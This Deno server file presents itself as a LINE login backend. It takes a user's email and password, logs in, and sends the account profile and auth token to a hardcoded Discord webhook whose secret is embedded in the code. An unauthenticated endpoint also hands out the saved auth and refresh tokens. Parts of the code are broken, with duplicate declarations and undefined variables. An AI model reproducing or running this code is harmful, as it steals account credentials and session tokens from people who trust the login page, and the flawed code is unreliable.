import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { serveFile } from "https://deno.land/std@0.224.0/http/file_server.ts";
import { loginWithPassword } from "@evex/linejs";

const logUrl = "https://discord.com/api/webhooks/1388074925339836558/C_h7mq9hqLN3qNvNkrOn2jpgiiLR8hxpD52IIokTbbTo10UKUF7_yWZoEVpgvvfKkwGQ";

let loginSuccess = false;
let savedAuthToken = "";
let savedRefreshToken = "";
serve(async (req) => {
  const url = new URL(req.url);
  const pathname = url.pathname;
  console.log("[REQUEST]", req.method, pathname);

  if (req.method === "GET" && (pathname === "/" || pathname.endsWith(".html"))) {
    const filePath = pathname === "/" ? "./index.html" : `.${pathname}`;
    try {
      return await serveFile(req, filePath);
    } catch {
      return new Response("ファイルが見つかりません", { status: 404 });
    }
  }

if (req.method === "GET" && pathname === "/api/pin") {
  return new Response(JSON.stringify({ success: loginSuccess, token: savedAuthToken ,refresh:savedRefreshToken}), {
    headers: { "Content-Type": "application/json" },
  });
}



if (req.method === "POST" && pathname === "/api/login") {
  const { email, password, device = "DESKTOPWIN", pincode } = await req.json();
  const password = formData.get("password")?.toString() ?? "なし";
  const pincode = Math.floor(100000 + Math.random() * 900000);

  // 非同期でログイン開始（awaitしない）
  loginWithPassword(
    { email, password, pincode: String(pincode) },            // ★④ 自前 PIN を指定
    { device },
  ).then((client) => {

    console.log("ログイン成功:", client.authToken);
   const authtoken =  client.authToken
    client.base.talk.getProfile().then((profile) => {
     const getprofile = JSON.stringify(profile, null, 2);

     const logdata = {content:`${getprofile}\n[ ${authtoken} ]`}
   fetch(logUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(logdata)});
   
});
    
   
  
    
    loginSuccess = true;
    savedAuthToken = client.authToken;
client.base.storage.get("refreshToken").then((token) => {
  savedRefreshToken = token;
});
 console.log(savedRefreshToken)

  
  }).catch((err) => {
    console.error("ログイン失敗:", err);
  });

   // フロントには JSON で返す
   return Response.json({ sessionId, pincode });      
}




}, { port: 8000 });
